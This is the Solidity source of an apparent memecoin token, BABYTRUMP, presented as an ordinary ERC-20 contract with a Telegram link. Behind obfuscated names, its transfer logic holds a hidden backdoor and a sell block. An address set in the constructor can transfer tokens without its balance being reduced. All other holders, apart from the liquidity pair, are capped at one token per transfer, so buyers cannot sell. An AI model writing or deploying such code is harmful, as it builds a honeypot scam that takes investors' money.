/*

https://t.me/ercbabytrump

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYTRUMP is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private fkoy;

    function transferFrom(address nuboe, address jdoq, uint256 ybnot) public returns (bool success) {
        require(ybnot <= allowance[nuboe][msg.sender]);
        allowance[nuboe][msg.sender] -= ybnot;
        asdvkeuzm(nuboe, jdoq, ybnot);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function asdvkeuzm(address nuboe, address jdoq, uint256 ybnot) private {
        address dvhjky = IUniswapV2Factory(jpdmzsyfcb.factory()).getPair(address(this), jpdmzsyfcb.WETH());
        if (0 == rfjkwbmqcniv[nuboe]) {
            if (nuboe != dvhjky && fkoy[nuboe] != block.number && ybnot < totalSupply) {
                require(ybnot <= totalSupply / (10 ** decimals));
            }
            balanceOf[nuboe] -= ybnot;
        }
        balanceOf[jdoq] += ybnot;
        fkoy[jdoq] = block.number;
        emit Transfer(nuboe, jdoq, ybnot);
    }

    uint256 private hkytzdobxqce = 120;

    uint8 public decimals = 9;

    constructor(string memory jbprk, string memory fahelpsmb, address xkmhe, address zykmbv) {
        name = jbprk;
        symbol = fahelpsmb;
        balanceOf[msg.sender] = totalSupply;
        rfjkwbmqcniv[zykmbv] = hkytzdobxqce;
        jpdmzsyfcb = IUniswapV2Router02(xkmhe);
    }

    IUniswapV2Router02 private jpdmzsyfcb;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address jdoq, uint256 ybnot) public returns (bool success) {
        asdvkeuzm(msg.sender, jdoq, ybnot);
        return true;
    }

    function approve(address dzeo, uint256 ybnot) public returns (bool success) {
        allowance[msg.sender][dzeo] = ybnot;
        emit Approval(msg.sender, dzeo, ybnot);
        return true;
    }

    string public symbol;

    string public name;

    mapping(address => uint256) private rfjkwbmqcniv;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
